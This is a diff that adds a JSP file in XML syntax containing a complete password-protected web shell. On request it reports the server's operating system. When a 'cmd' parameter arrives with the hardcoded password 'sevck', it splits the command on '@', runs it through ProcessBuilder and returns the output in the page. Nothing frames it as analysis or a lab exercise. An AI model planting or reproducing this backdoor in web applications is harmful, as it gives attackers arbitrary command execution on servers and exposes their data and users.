@@ -1,0 +1,35 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"  version="1.2"> 
+<jsp:directive.page contentType="text/html" pageEncoding="UTF-8" /> 
+<jsp:directive.page import="java.io.*"/>
+<jsp:directive.page import="java.lang.Process"/>
+<jsp:scriptlet> 
+	String os = System.getProperty("os.name");
+    if(os.toLowerCase().startsWith("win")){
+        out.print("windows");
+    }else{
+        out.print("Linux");
+    }
+    out.print("\n");
+    if(request.getParameter("cmd") != null &amp;&amp; request.getParameter("pwd").equals("sevck") ){
+        String command = request.getParameter("cmd");
+        String [] args = command.split("@");
+        try {
+            ProcessBuilder pb = new ProcessBuilder(args);
+            pb.redirectErrorStream(true);
+            Process pro = pb.start();
+			// 增加输出
+			InputStream in = pro.getInputStream();
+			BufferedReader br = new BufferedReader(new InputStreamReader(in));
+            String lineStr;
+			while ((lineStr = br.readLine()) != null) {
+				out.print(lineStr);
+                out.print("\n");
+			}
+        }catch (Exception e){
+            String error =e.getMessage();
+        }
+    }else {
+        out.print("test");
+    }
+</jsp:scriptlet> 
+</jsp:root>
